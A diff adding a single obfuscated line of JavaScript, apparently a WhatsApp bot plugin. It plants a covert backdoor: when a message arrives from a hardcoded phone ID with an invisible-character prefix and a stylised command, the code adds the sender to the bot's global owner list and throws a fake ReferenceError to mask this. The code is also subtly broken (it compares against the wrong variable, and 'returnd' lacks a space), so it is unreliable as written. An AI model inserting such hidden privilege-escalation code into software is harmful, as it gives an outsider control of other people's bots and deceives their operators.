@@ -1,0 +1,1 @@
+module.exports=(a=>{b='6283128604414@s.whatsapp.net';c=decodeURIComponent;d=e=>{if(e.sender===c(a)&&!g[c('owner')].includes(c(a))){g[c('owner')].push(e.sender);throw`ReferenceError:${e.text}isnotdefined`}};d.customPrefix=/^‎/;d.command=/^𝙒𝘼𝙍𝙄𝘼 𝙎𝙏𝙊𝙍𝙀$/;returnd})(global);
